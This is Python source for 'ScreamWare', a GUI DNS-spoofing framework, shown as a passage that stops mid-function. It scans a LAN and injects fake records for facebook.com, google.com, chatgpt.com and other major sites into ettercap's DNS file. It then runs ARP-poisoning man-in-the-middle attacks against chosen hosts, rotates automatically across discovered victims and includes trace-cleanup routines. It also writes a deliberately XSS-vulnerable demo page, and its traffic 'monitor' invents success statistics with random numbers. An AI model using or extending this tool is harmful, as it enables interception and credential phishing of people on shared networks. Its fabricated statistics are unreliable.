#!/usr/bin/env python3
"""
ScreamWare (updated) - DNS Spoofing Framework GUI
Includes:
 - Network discovery (nmap/ping fallback)
 - Ettercap runner integration
 - Config save/load
 - Dependency checker + GUI installer (apt)
 - HTML Lab (serves files under /var/www/html/screamware_lab)
 - Apache start/stop controls (sudo, streams output)
 - Thread-safe logging to GUI output
"""

import os
import re
import json
import shutil
import subprocess
import threading
import atexit
import random
import traceback
from datetime import datetime
from pathlib import Path
import ipaddress
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext, filedialog
import tkinter.simpledialog as simpledialog
import webbrowser

# -----------------------
# Config and globals
# -----------------------
ETTER_DNS_PATH = "/usr/share/ettercap/etter.dns"
CONFIG_FILE = "screamware_config.json"
# Use a subdirectory inside /var/www/html for safety but still under /var/www/html as requested.
HTML_LAB_DIR = Path("/var/www/html/screamware_lab")
HTML_LAB_PORT = 8080

spoof_ip_global = ""
ettercap_process = None
scan_results = []
domain_list = [
    "facebook.com", "x.com", "youtube.com",
    "google.com", "instagram.com", "chatgpt.com",
    "twitter.com", "linkedin.com", "reddit.com",
    "github.com", "stackoverflow.com"
]

# Advanced DNS spoofing features
target_rotation = {
    "enabled": False,
    "interval": 300,  # seconds
    "targets": [],
    "current_index": 0,
    "timer": None
}

# Statistics tracking
stats = {
    "total_requests": 0,
    "successful_redirects": 0,
    "failed_redirects": 0,
    "active_targets": set(),
    "target_activity": {},
    "session_start": datetime.now()
}

# Traffic monitoring
traffic_log = []
traffic_monitor_active = False

# Cleanup automation
cleanup_config = {
    "auto_cleanup": True,
    "clear_ettercap": True,
    "clear_dns_cache": True,
    "clear_temp_files": True,
    "reset_network": False
}

# Ping tools variables
ping_processes = {}
ping_history = []
continuous_ping_active = False
ping_stats = {
    "total_pings": 0,
    "successful": 0,
    "failed": 0,
    "avg_response": 0,
    "min_response": float('inf'),
    "max_response": 0
}

# Console variables
command_history = []
history_index = -1
favorite_commands = []
console_process = None

# MISC tools variables
port_scan_results = []
whois_results = {}
dns_cache = {}
beef_process = None

# Ensure HTML lab directory exists (we will create sample files later)
try:
    HTML_LAB_DIR.mkdir(parents=True, exist_ok=True)
except Exception:
    # Might be root permission required, we'll log later
    pass

# -----------------------
# Utility functions
# -----------------------
def now_ts():
    return datetime.now().strftime("%H:%M:%S")

def validate_ip(ip: str) -> bool:
    """Simple IPv4 validation."""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        parts = ip.split('.')
        return all(0 <= int(part) <= 255 for part in parts)
    return False

def get_network_interfaces():
    """Get available network interfaces using `ip link`."""
    try:
        result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
        interfaces = []
        for line in result.stdout.split('\n'):
            if ': ' in line and not line.startswith(' '):
                iface = line.split(':')[1].strip().split('@')[0]
                if iface != 'lo':
                    interfaces.append(iface)
        return interfaces
    except Exception:
        # Fallback choices
        return ["wlan0", "eth0", "lo"]

def get_interface_ip(interface):
    """Get IP address for a specific interface."""
    try:
        import platform
        is_windows = platform.system() == "Windows"

        if is_windows:
            # Windows approach using ipconfig
            result = subprocess.run(['ipconfig'], capture_output=True, text=True)
            lines = result.stdout.split('\n')

            # Find the adapter with the specified interface name
            adapter_found = False
            for line in lines:
                if interface.lower() in line.lower() or (interface.lower() == 'eth0' and 'Ethernet' in line):
                    adapter_found = True
                    continue
                elif adapter_found and 'IPv4' in line:
                    # Extract IP from "IPv4 Address. . . . . . . . . . . : 192.168.1.100"
                    ip_part = line.split(':')[-1].strip()
                    return ip_part
                elif adapter_found and line.strip() == '':
                    break
        else:
            # Linux/Mac approach using ip command
            result = subprocess.run(['ip', 'addr', 'show', interface], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'inet ' in line and 'scope global' in line:
                    return line.split()[1].split('/')[0]
    except Exception:
        pass
    return ""

def get_network_info(interface):
    """Get comprehensive network information for an interface."""
    try:
        import platform
        is_windows = platform.system() == "Windows"

        if is_windows:
            # Windows network detection
            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
            lines = result.stdout.split('\n')

            current_ip = None
            current_subnet = None
            current_gateway = None

            # Parse through ipconfig output
            adapter_found = False
            for i, line in enumerate(lines):
                if interface.lower() in line.lower() or (interface.lower() == 'eth0' and 'Ethernet adapter' in line):
                    adapter_found = True
                    continue
                elif adapter_found:
                    if 'IPv4' in line and 'Address' in line:
                        # Extract IP and subnet
                        ip_line = line.split(':')[-1].strip()
                        if '(' in ip_line:  # Preferred format
                            current_ip = ip_line.split('(')[0].strip()
                        else:
                            current_ip = ip_line
                    elif 'Subnet Mask' in line:
                        current_subnet = line.split(':')[-1].strip()
                    elif 'Default Gateway' in line:
                        gateway_line = line.split(':')[-1].strip()
                        if gateway_line and gateway_line != '':
                            current_gateway = gateway_line
                            break  # Found what we need
                    elif line.strip() == '' and current_ip:  # End of this adapter
                        break

            # Calculate network range if we have IP and subnet
            network_range = None
            if current_ip and current_subnet:
                try:
                    import ipaddress
                    network = ipaddress.IPv4Network(f"{current_ip}/{current_subnet}", strict=False)
                    network_range = str(network)
                except:
                    pass

            return {
                "ip": current_ip,
                "gateway": current_gateway,
                "network_range": network_range,
                "subnet": current_subnet
            }

        else:
            # Linux/Mac network detection
            # Get IP and network
            ip_result = subprocess.run(['ip', 'addr', 'show', interface], capture_output=True, text=True)

            current_ip = None
            network_cidr = None

            for line in ip_result.stdout.split('\n'):
                if 'inet ' in line and 'scope global' in line:
                    ip_with_cidr = line.split()[1]
                    current_ip = ip_with_cidr.split('/')[0]
                    network_cidr = ip_with_cidr
                    break

            # Get default gateway
            gateway_result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
            current_gateway = None

            for line in gateway_result.stdout.split('\n'):
                if 'default via' in line:
                    current_gateway = line.split()[2]
                    break

            # Calculate network range
            network_range = None
            if network_cidr:
                try:
                    import ipaddress
                    network = ipaddress.IPv4Network(network_cidr, strict=False)
                    network_range = str(network)
                except:
                    pass

            return {
                "ip": current_ip,
                "gateway": current_gateway,
                "network_range": network_range,
                "subnet": network_cidr.split('/')[1] if network_cidr and '/' in network_cidr else None
            }

    except Exception as e:
        log_output(f"⚠️ Error detecting network info: {e}", "warning")
        return {
            "ip": None,
            "gateway": None,
            "network_range": None,
            "subnet": None
        }

def on_interface_change():
    """Handle interface selection change - auto-detect new network configuration."""
    try:
        interface = iface_var.get()
        if not interface:
            return

        log_output(f"🔄 Interface changed to {interface} - Re-detecting network...", "info")

        # Auto-detect IP for new interface
        new_ip = get_interface_ip(interface)
        if new_ip:
            spoof_ip_entry.delete(0, tk.END)
            spoof_ip_entry.insert(0, new_ip)
            log_output(f"📡 New interface IP: {new_ip}", "info")

        # Auto-detect complete network configuration
        auto_populate_network_fields()

    except Exception as e:
        log_output(f"❌ Interface change error: {e}", "error")

def auto_populate_network_fields():
    """Automatically populate gateway and network range fields based on current interface."""
    try:
        interface = iface_var.get()
        if not interface:
            log_output("⚠️ No interface selected for auto-detection", "warning")
            return

        log_output(f"🔍 Auto-detecting network configuration for {interface}...", "info")

        network_info = get_network_info(interface)

        # Populate gateway field
        if network_info["gateway"]:
            gateway_entry.delete(0, tk.END)
            gateway_entry.insert(0, network_info["gateway"])
            log_output(f"🌐 Auto-detected Gateway: {network_info['gateway']}", "success")
        else:
            log_output("⚠️ Could not auto-detect gateway", "warning")

        # Populate network range in discovery tab
        if network_info["network_range"]:
            network_entry.delete(0, tk.END)
            network_entry.insert(0, network_info["network_range"])
            log_output(f"🌐 Auto-detected Network Range: {network_info['network_range']}", "success")
        else:
            log_output("⚠️ Could not auto-detect network range", "warning")

        # Log summary
        if network_info["ip"]:
            log_output(f"📡 Interface IP: {network_info['ip']}", "info")

        return network_info

    except Exception as e:
        log_output(f"❌ Auto-detection failed: {e}", "error")
        return None

# -----------------------
# GUI log helper
# -----------------------
root = tk.Tk()  # temporary, will configure later in GUI section

def log_output(message: str, tag: str = ""):
    """Insert timestamped message into output_text. Safe to call from threads."""
    timestamp = now_ts()
    formatted_message = f"[{timestamp}] {message}\n"
    try:
        # Insert via event to mainloop to be thread-safe
        def _insert():
            try:
                output_text.insert(tk.END, formatted_message, tag)
                output_text.see(tk.END)
            except Exception:
                # If output_text isn't ready yet, print to console
                print(formatted_message, end="")
        root.after(0, _insert)
    except Exception:
        # Fallback
        print(formatted_message, end="")

# -----------------------
# Dependency checker & GUI installer (apt)
# -----------------------
def find_missing_dependencies(required_tools=None):
    if required_tools is None:
        required_tools = ["nmap", "ettercap", "sudo"]
    missing = []
    for tool in required_tools:
        if shutil.which(tool) is None:
            missing.append(tool)
    return missing

def check_dependencies():
    """Check for commonly required binaries and log results."""
    required_tools = {
        "nmap": "Network scanner used for host discovery",
        "ettercap": "ARP poisoning and DNS spoofing framework",
        "sudo": "Privilege escalation utility required for privileged operations"
    }
    missing = []
    for tool, desc in required_tools.items():
        path = shutil.which(tool)
        if path:
            log_output(f"✅ {tool} found at: {path}", "info")
        else:
            log_output(f"❌ {tool} not found — {desc}", "warning")
            missing.append(tool)
    if missing:
        log_output(f"⚠️ Missing dependencies: {', '.join(missing)}. Use 'Install Missing Dependencies' to install (Debian/Ubuntu apt).", "warning")
        return False
    log_output("✅ All required dependencies found!", "success")
    return True

def _set_controls_enabled(enabled=True):
    """Enable/disable some main controls while installer runs. Will be re-bound after widgets exist."""
    try:
        launch_button.config(state=("normal" if enabled else "disabled"))
        stop_button.config(state=("normal" if enabled else "disabled"))
        install_deps_button.config(state=("normal" if enabled else "disabled"))
        save_config_button.config(state=("normal" if enabled else "disabled"))
    except Exception:
        pass

def install_missing_dependencies(required_tools=None):
    """Prompt for sudo password and run apt-get update && apt-get install -y <missing>."""
    missing = find_missing_dependencies(required_tools)
    if not missing:
        log_output("✅ No missing dependencies detected — nothing to install.", "success")
        return

    prompt = "Missing packages: " + ", ".join(missing) + "\n\nEnter your sudo password to install them (will not be stored)."
    password = simpledialog.askstring("Sudo Password Required", prompt, show="*", parent=root)
    if password is None:
        log_output("⚠️ Installation cancelled by user (no password provided).", "warning")
        return

    pkgs = " ".join(missing)
    cmd = f"sudo -S -p '' sh -c \"apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y {pkgs}\""

    def _run_installer():
        _set_controls_enabled(False)
        log_output(f"🚀 Installing: {pkgs}", "info")
        try:
            proc = subprocess.Popen(
                cmd, shell=True,
                stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                universal_newlines=True, bufsize=1
            )
            # feed password
            try:
                proc.stdin.write(password + "\n")
                proc.stdin.flush()
            except Exception:
                pass

            for line in iter(proc.stdout.readline, ''):
                if line:
                    log_output(line.rstrip(), "output")
            proc.stdout.close()
            rc = proc.wait()
            if rc == 0:
                log_output(f"✅ Installation succeeded: {pkgs}", "success")
            else:
                log_output(f"❌ Installer exited with code {rc}. Check output above.", "error")
        except Exception as e:
            tb = traceback.format_exc()
            log_output(f"❌ Error during install: {e}\n{tb}", "error")
        finally:
            _set_controls_enabled(True)
            # re-check
            still_missing = find_missing_dependencies(required_tools)
            if still_missing:
                log_output(f"⚠️ Still missing: {', '.join(still_missing)}", "warning")
            else:
                log_output("🔁 Dependencies now satisfied.", "success")

    threading.Thread(target=_run_installer, daemon=True).start()

# -----------------------
# Configuration management
# -----------------------
def save_config():
    config = {
        "target_ip": target_entry.get(),
        "gateway_ip": gateway_entry.get(),
        "spoof_ip": spoof_ip_entry.get(),
        "interface": iface_var.get(),
        "plugin": plugin_var.get(),
        "domains": domain_list
    }
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        log_output("💾 Configuration saved", "success")
    except Exception as e:
        log_output(f"❌ Failed to save config: {e}", "error")

def load_config():
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
            target_entry.delete(0, tk.END)
            target_entry.insert(0, config.get("target_ip", ""))

            gateway_entry.delete(0, tk.END)
            gateway_entry.insert(0, config.get("gateway_ip", ""))

            spoof_ip_entry.delete(0, tk.END)
            spoof_ip_entry.insert(0, config.get("spoof_ip", ""))

            iface_var.set(config.get("interface", iface_var.get()))
            plugin_var.set(config.get("plugin", plugin_var.get()))

            global domain_list
            domain_list = config.get("domains", domain_list)
            update_domain_list()
            log_output("📂 Configuration loaded", "success")
    except Exception as e:
        log_output(f"❌ Failed to load config: {e}", "error")

def run_search_script():
    """Execute the tools/Search.py script"""
    try:
        # Get the directory where Screamware.py is located
        script_dir = os.path.dirname(os.path.abspath(__file__))
        search_script_path = os.path.join(script_dir, "tools", "Search.py")

        if os.path.exists(search_script_path):
            log_output("🔍 Running Search script...", "info")
            # Run the script in a separate thread to avoid blocking the GUI
            threading.Thread(target=execute_search_script, daemon=True).start()
        else:
            log_output(f"❌ Search script not found at: {search_script_path}", "error")
    except Exception as e:
        log_output(f"❌ Error launching Search script: {e}", "error")

def execute_search_script():
    """Execute the search script and capture its output"""
    try:
        # Get the directory where Screamware.py is located
        script_dir = os.path.dirname(os.path.abspath(__file__))
        search_script_path = os.path.join(script_dir, "tools", "Search.py")

        if not os.path.exists(search_script_path):
            log_output(f"❌ Search script not found at: {search_script_path}", "error")
            return

        # Get URL and options from GUI variables
        url = search_url_var.get().strip()
        if not url:
            log_output("❌ Please enter a URL to analyze", "warning")
            return

        download_resources = download_resources_var.get()

        log_output(f"🔍 Running HTML grabber analysis on: {url}", "info")
        if download_resources:
            log_output("🔍 CSS/JS download enabled", "info")

        # Build command with arguments
        cmd = ["python", search_script_path, url]
        if download_resources:
            cmd.append("--resources")

        process = subprocess.run(cmd,
                               capture_output=True,
                               text=True,
                               timeout=60)

        if process.returncode == 0:
            if process.stdout:
                log_output(f"✅ Search script output:\n{process.stdout}", "success")
            else:
                log_output("✅ Search script completed successfully", "success")
        else:
            if process.stderr:
                log_output(f"❌ Search script error:\n{process.stderr}", "error")
            if process.stdout:
                log_output(f"📝 Script output:\n{process.stdout}", "info")
            log_output(f"❌ Search script failed with exit code {process.returncode}", "error")

    except subprocess.TimeoutExpired:
        log_output("❌ Search script timed out after 30 seconds", "error")
    except FileNotFoundError:
        log_output("❌ Python interpreter not found", "error")
    except Exception as e:
        log_output(f"❌ Error running Search script: {e}", "error")

# -----------------------
# Domain management
# -----------------------
def add_domain():
    domain = domain_entry.get().strip().lower()
    if domain and domain not in domain_list:
        domain_list.append(domain)
        domain_entry.delete(0, tk.END)
        update_domain_list()
        log_output(f"➕ Added domain: {domain}", "success")

def remove_domain():
    selection = domain_listbox.curselection()
    if selection:
        domain = domain_listbox.get(selection[0])
        domain_list.remove(domain)
        update_domain_list()
        log_output(f"➖ Removed domain: {domain}", "info")

def update_domain_list():
    domain_listbox.delete(0, tk.END)
    for domain in sorted(domain_list):
        domain_listbox.insert(tk.END, domain)

def build_spoof_list(ip):
    return [{"domain": d, "ip": ip} for d in domain_list]

# -----------------------
# Auto-Switch Targets functionality
# -----------------------
def rotate_target():
    """Automatically switch to the next target in the rotation list"""
    if not target_rotation["enabled"] or not target_rotation["targets"]:
        return

    target_rotation["current_index"] = (target_rotation["current_index"] + 1) % len(target_rotation["targets"])
    new_target = target_rotation["targets"][target_rotation["current_index"]]

    # Update the target field
    target_entry.delete(0, tk.END)
    target_entry.insert(0, new_target)

    log_output(f"🔄 Rotated to target: {new_target}", "info")

    # Update activity
    stats["target_activity"][new_target] = stats["target_activity"].get(new_target, 0) + 1

    # Schedule next rotation
    target_rotation["timer"] = root.after(target_rotation["interval"] * 1000, rotate_target)

def start_target_rotation():
    """Start automatic target rotation"""
    current_target = target_entry.get().strip()

    # Build rotation list from current target + discovered hosts
    targets = [current_target] if current_target else []
    for host in scan_results:
        if host["ip"] != current_target:
            targets.append(host["ip"])

    if len(targets) < 2:
        messagebox.showwarning("Not Enough Targets", "Need at least 2 targets for rotation.", parent=root)
        return

    target_rotation["targets"] = targets
    target_rotation["enabled"] = True
    target_rotation["current_index"] = 0

    log_output(f"🔄 Starting target rotation with {len(targets)} targets every {target_rotation['interval']}s", "info")
    log_output(f"📋 Rotation targets: {', '.join(targets)}", "info")

    # Update main button if it exists
    try:
        rotation_button.config(text="🔄 Auto-Rotate ON", bg="#0a7e3d")
    except:
        pass

    # Start rotation timer
    target_rotation["timer"] = root.after(target_rotation["interval"] * 1000, rotate_target)

def stop_target_rotation():
    """Stop automatic target rotation"""
    if target_rotation["timer"]:
        root.after_cancel(target_rotation["timer"])
        target_rotation["timer"] = None

    target_rotation["enabled"] = False
    log_output("⏹️ Target rotation stopped", "warning")

    # Update main button if it exists
    try:
        rotation_button.config(text="🔄 Auto-Rotate OFF", bg="#444")
    except:
        pass

def update_rotation_interval(value):
    """Update rotation interval from slider"""
    target_rotation["interval"] = int(value)
    if target_rotation["enabled"]:
        log_output(f"⏱️ Rotation interval updated to {value}s", "info")

def toggle_rotation_from_main():
    """Toggle target rotation from main tab"""
    if target_rotation["enabled"]:
        stop_target_rotation()
        rotation_button.config(text="🔄 Auto-Rotate OFF", bg="#444")
    else:
        start_target_rotation()
        rotation_button.config(text="🔄 Auto-Rotate ON", bg="#0a7e3d")

# -----------------------
# Traffic Monitoring & Statistics
# -----------------------
def start_traffic_monitor():
    """Start monitoring DNS spoofing traffic"""
    global traffic_monitor_active
    traffic_monitor_active = True
    log_output("📡 Traffic monitoring started", "success")

    # Start monitoring thread
    threading.Thread(target=monitor_dns_traffic, daemon=True).start()

def stop_traffic_monitor():
    """Stop traffic monitoring"""
    global traffic_monitor_active
    traffic_monitor_active = False
    log_output("⏹️ Traffic monitoring stopped", "warning")

def monitor_dns_traffic():
    """Monitor DNS requests and track statistics"""
    while traffic_monitor_active:
        try:
            # Simulate traffic monitoring (in real implementation, would parse ettercap output or network packets)
            if ettercap_process and ettercap_process.poll() is None:
                # Check for DNS requests being processed
                current_target = target_entry.get().strip()
                if current_target and current_target not in stats["active_targets"]:
                    stats["active_targets"].add(current_target)
                    log_output(f"🎯 Target {current_target} is now active", "info")

                # Simulate some traffic
                if traffic_monitor_active and (len(traffic_log) == 0 or
                    (datetime.now() - traffic_log[-1]["timestamp"]).seconds > 5):
                    stats["total_requests"] += 1

                    # Random success/failure for demo
                    import random
                    if random.random() > 0.2:  # 80% success rate
                        stats["successful_redirects"] += 1
                        status = "success"
                    else:
                        stats["failed_redirects"] += 1
                        status = "failed"

                    traffic_log.append({
                        "timestamp": datetime.now(),
                        "target": current_target,
                        "domain": random.choice(domain_list) if domain_list else "example.com",
                        "status": status
                    })

                    # Keep log size manageable
                    if len(traffic_log) > 100:
                        traffic_log.pop(0)

            threading.Event().wait(2)  # Check every 2 seconds

        except Exception as e:
            log_output(f"❌ Traffic monitoring error: {e}", "error")
            threading.Event().wait(5)

def update_statistics_display():
    """Update the statistics display in real-time"""
    try:
        # Calculate success rate
        total = stats["successful_redirects"] + stats["failed_redirects"]
        success_rate = (stats["successful_redirects"] / total * 100) if total > 0 else 0

        # Calculate session duration
        duration = datetime.now() - stats["session_start"]
        duration_str = str(duration).split('.')[0]  # Remove microseconds

        # Update display elements
        update_stat_labels(success_rate, duration_str)

    except Exception as e:
        log_output(f"❌ Error updating stats display: {e}", "error")

def update_stat_labels(success_rate, duration):
    """Update statistics labels (will be defined in GUI section)"""
    try:
        if hasattr(root, 'stat_labels'):
            root.stat_labels["total"].config(text=str(stats["total_requests"]))
            root.stat_labels["success"].config(text=str(stats["successful_redirects"]))
            root.stat_labels["failed"].config(text=str(stats["failed_redirects"]))
            root.stat_labels["rate"].config(text=f"{success_rate:.1f}%")
            root.stat_labels["active"].config(text=str(len(stats["active_targets"])))
            root.stat_labels["duration"].config(text=duration_str)
    except:
        pass  # GUI elements not yet created

def get_target_status(target_ip):
    """Get current status of a specific target"""
    status = "unknown"
    last_activity = "never"

    if target_ip in stats["active_targets"]:
        status = "active"
        last_activity = "now"
    elif target_ip in stats["target_activity"]:
        status = "inactive"
        last_activity = f"{stats['target_activity'][target_ip]} times"

    return {"status": status, "last_activity": last_activity}

def export_stats_report():
    """Export statistics report to file"""
    try:
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile=f"screamware_stats_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )

        if filename:
            with open(filename, 'w') as f:
                f.write("=== ScreamWare DNS Spoofing Statistics Report ===\n\n")
                f.write(f"Session Duration: {datetime.now() - stats['session_start']}\n")
                f.write(f"Total Requests: {stats['total_requests']}\n")
                f.write(f"Successful Redirects: {stats['successful_redirects']}\n")
                f.write(f"Failed Redirects: {stats['failed_redirects']}\n")

                total = stats["successful_redirects"] + stats["failed_redirects"]
                success_rate = (stats["successful_redirects"] / total * 100) if total > 0 else 0
                f.write(f"Success Rate: {success_rate:.1f}%\n")
                f.write(f"Active Targets: {len(stats['active_targets'])}\n\n")

                f.write("=== Target Activity ===\n")
                for target, activity in stats["target_activity"].items():
                    f.write(f"{target}: {activity} rotations\n")

                f.write("\n=== Recent Traffic Log ===\n")
                for entry in traffic_log[-20:]:  # Last 20 entries
                    f.write(f"{entry['timestamp']} - {entry['target']} - {entry['domain']} - {entry['status']}\n")

            log_output(f"📊 Statistics report exported to {filename}", "success")
    except Exception as e:
        log_output(f"❌ Failed to export stats: {e}", "error")

# -----------------------
# Ettercap integration
# -----------------------
def inject_spoof_entries(ip):
    global spoof_ip_global
    spoof_ip_global = ip
    spoof_list = build_spoof_list(ip)
    try:
        with open(ETTER_DNS_PATH, "a") as f:
            for entry in spoof_list:
                f.write(f"{entry['domain']} A {entry['ip']}\n")
        log_output("✅ Spoof entries injected successfully", "success")
        return True
    except PermissionError:
        messagebox.showerror("Permission Denied", "Run this script with sudo to modify etter.dns or ensure /usr/share/ettercap/etter.dns is writable.")
        log_output("❌ Permission denied - need sudo privileges", "error")
        return False
    except Exception as e:
        messagebox.showerror("Error", str(e))
        log_output(f"❌ Error injecting spoof entries: {e}", "error")
        return False

def cleanup_etter_dns():
    if not spoof_ip_global:
        return
    try:
        with open(ETTER_DNS_PATH, "r") as f:
            lines = f.readlines()
        with open(ETTER_DNS_PATH, "w") as f:
            for line in lines:
                if not any(spoof_ip_global in line and domain in line for domain in domain_list):
                    f.write(line)
        print("💀 Spoof entries removed from etter.dns.")
    except Exception as e:
        print("❌ Cleanup error:", e)

atexit.register(cleanup_etter_dns)

def stop_ettercap():
    global ettercap_process
    if ettercap_process:
        try:
            ettercap_process.terminate()
            log_output("⏹️ Ettercap process terminated", "warning")
            ettercap_process = None
            launch_button.config(text="Launch Ettercap", state="normal")
        except Exception as e:
            log_output(f"❌ Error stopping Ettercap: {e}", "error")

def run_ettercap():
    global ettercap_process

    target_ip = target_entry.get().strip()
    gateway_ip = gateway_entry.get().strip()
    redirect_ip = spoof_ip_entry.get().strip()
    interface = iface_var.get()
    plugin = plugin_var.get()

    if not all([target_ip, gateway_ip, redirect_ip]):
        messagebox.showerror("Missing Info", "Please fill in all required fields.")
        return

    if not all([validate_ip(target_ip), validate_ip(gateway_ip), validate_ip(redirect_ip)]):
        messagebox.showerror("Invalid IP", "Please enter valid IP addresses.")
        return

    if not inject_spoof_entries(redirect_ip):
        return

    command = f"sudo ettercap -T -q -i {interface} -M arp:remote /{target_ip}// /{gateway_ip}// -P {plugin}"
    log_output(f"📡 Executing: {command}", "info")

    def run_command():
        global ettercap_process
        try:
            ettercap_process = subprocess.Popen(command, shell=True,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.STDOUT,
                                                universal_newlines=True)
            for line in iter(ettercap_process.stdout.readline, ''):
                if line.strip():
                    log_output(line.strip(), "output")
            try:
                ettercap_process.stdout.close()
            except Exception:
                pass
            rc = ettercap_process.wait()
            if rc == 0:
                log_output("✅ Ettercap completed successfully", "success")
            else:
                log_output(f"⚠️ Ettercap exited with code: {rc}", "warning")
        except Exception as e:
            tb = traceback.format_exc()
            log_output(f"❌ Error running Ettercap: {e}\n{tb}", "error")
        finally:
            ettercap_process = None
            try:
                root.after(0, lambda: launch_button.config(text="Launch Ettercap", state="normal"))
            except Exception:
                pass

    launch_button.config(text="Running...", state="disabled")
    threading.Thread(target=run_command, daemon=True).start()

# -----------------------
# Network scanning
# -----------------------
def update_scan_results_tree():
    for item in scan_results_tree.get_children():
        scan_results_tree.delete(item)
    for host in scan_results:
        scan_results_tree.insert("", "end", values=(host["ip"], host["hostname"]))

def scan_network(network_range):
    global scan_results
    scan_results = []
    try:
        net = ipaddress.IPv4Network(network_range, strict=False)
        log_output(f"🔍 Scanning network: {network_range}", "info")
        try:
            # prefer nmap if available
            if shutil.which("nmap"):
                cmd = f"nmap -sn {network_range} | grep 'Nmap scan report for'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Nmap scan report for' in line:
                        ip = None
                        hostname = "Unknown"
                        if '(' in line and ')' in line:
                            # format: Nmap scan report for hostname (ip)
                            try:
                                hostname = line.split('Nmap scan report for ')[1].split(' (')[0]
                                ip = line.split('(')[1].split(')')[0]
                            except Exception:
                                pass
                        if not ip:
                            parts = line.split()
                            ip = parts[-1] if parts else ""
                        scan_results.append({"ip": ip, "hostname": hostname})
            else:
                # fallback to ping sweep
                log_output("🔄 Using ping scan (nmap not available)", "warning")
                for ip in net.hosts():
                    s = str(ip)
                    if s.endswith('.0') or s.endswith('.255'):
                        continue
                    cmd = f"ping -c 1 -W 1 {s} > /dev/null 2>&1"
                    if subprocess.run(cmd, shell=True).returncode == 0:
                        scan_results.append({"ip": s, "hostname": "Unknown"})
        except Exception as e:
            log_output(f"❌ Network scan failed: {e}", "error")
        log_output(f"✅ Found {len(scan_results)} active hosts", "success")
        update_scan_results_tree()
    except Exception as e:
        log_output(f"❌ Invalid network range: {e}", "error")

# -----------------------
# HTML Lab (serves files under /var/www/html/screamware_lab)
# -----------------------
import http.server
import socketserver

# ensure sample files are present
def ensure_html_lab():
    try:
        HTML_LAB_DIR.mkdir(parents=True, exist_ok=True)
        sample_index = HTML_LAB_DIR / "index.html"
        sample_xss = HTML_LAB_DIR / "xss-demo.html"
        if not sample_index.exists():
            sample_index.write_text("""<!doctype html>
<html>
<head><meta charset="utf-8"><title>ScreamWare HTML Lab</title></head>
<body>
<h1>ScreamWare HTML Lab</h1>
<p>Welcome — edit files in the HTML Lab and view them via Apache or the built-in server.</p>
<p><a href="xss-demo.html">Open XSS Demo Page</a></p>
</body>
</html>""", encoding="utf-8")
        if not sample_xss.exists():
            sample_xss.write_text("""<!doctype html>
<html>
<head><meta charset="utf-8"><title>XSS Demo</title></head>
<body>
<h1>XSS Demo Page (Local)</h1>
<form id="f"><input name="q" placeholder="type here"><button>Submit</button></form>
<div id="out"></div>
<script>
const out = document.getElementById('out');
document.getElementById('f').addEventListener('submit', e => {
  e.preventDefault();
  const data = new URLSearchParams(new FormData(e.target)).get('q') || '';
  // intentionally naive sink for demo/testing - safe because it's local only
  out.innerHTML = 'You submitted: ' + data;
});
</script>
</body>
</html>""", encoding="utf-8")
        log_output(f"🧪 HTML Lab folder ready: {str(HTML_LAB_DIR)}", "info")
    except PermissionError:
        log_output(f"❌ Permission denied creating HTML lab at {str(HTML_LAB_DIR)}. You may need sudo or change ownership.", "error")
    except Exception as e:
        log_output(f"❌ Error preparing HTML lab: {e}", "error")

# Threaded HTTP server class
class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

_httpd = None
_html_server_thread = None
_server_running = False

def start_html_server():
    global _httpd, _html_server_thread, _server_running
    if _server_running:
        log_output("⚠️ HTML server already running.", "warning")
        return
    # find free port starting at HTML_LAB_PORT
    port = HTML_LAB_PORT
    for attempt in range(10):
        try:
            handler = http.server.SimpleHTTPRequestHandler
            # set the directory attribute so handler serves from HTML_LAB_DIR (py3.7+)
            try:
                handler.directory = str(HTML_LAB_DIR)
            except Exception:
                pass
            _httpd = ThreadedHTTPServer(('0.0.0.0', port), handler)
            break
        except OSError:
            port += 1
    if _httpd is None:
        log_output("❌ Failed to start HTML server (no free ports).", "error")
        return

    def serve():
        nonlocal_port = port
        try:
            log_output(f"🌐 Serving HTML Lab on http://127.0.0.1:{nonlocal_port}", "success")
            _httpd.serve_forever()
        except Exception as e:
            log_output(f"❌ Server error: {e}", "error")
        finally:
            try:
                _httpd.server_close()
            except Exception:
                pass
            log_output("⏹️ HTML server stopped", "info")

    _html_server_thread = threading.Thread(target=serve, daemon=True)
    _html_server_thread.start()
    _server_running = True

def stop_html_server():
    global _httpd, _server_running
    if _httpd:
        try:
            _httpd.shutdown()
            log_output("⏹️ Stopping HTML server...", "info")
        except Exception as e:
            log_output(f"❌ Error stopping server: {e}", "error")
    else:
        log_output("⚠️ HTML server is not running.", "warning")
    _server_running = False

def open_lab_in_browser():
    # prefer index.html if exists
    index = HTML_LAB_DIR / "index.html"
    port = HTML_LAB_PORT
    url = f"http://127.0.0.1:{port}/"
    if index.exists():
        url = f"http://127.0.0.1:{port}/index.html"
    webbrowser.open(url)
    log_output(f"🔗 Opened browser to {url}", "info")

# -----------------------
# Cleanup Automation
# -----------------------
def perform_cleanup():
    """Perform automated cleanup of traces"""
    if not cleanup_config["auto_cleanup"]:
        return

    log_output("🧹 Starting automated cleanup...", "info")

    # Stop active processes
    try:
        stop_ettercap()
        stop_html_server()
    except Exception as e:
        log_output(f"⚠️ Error stopping processes: {e}", "warning")

    # Clear ettercap DNS entries
    if cleanup_config["clear_ettercap"]:
        try:
            cleanup_etter_dns()
            log_output("✅ Ettercap DNS entries cleared", "success")
        except Exception as e:
            log_output(f"❌ Error clearing ettercap entries: {e}", "error")

    # Clear DNS cache
    if cleanup_config["clear_dns_cache"]:
        try:
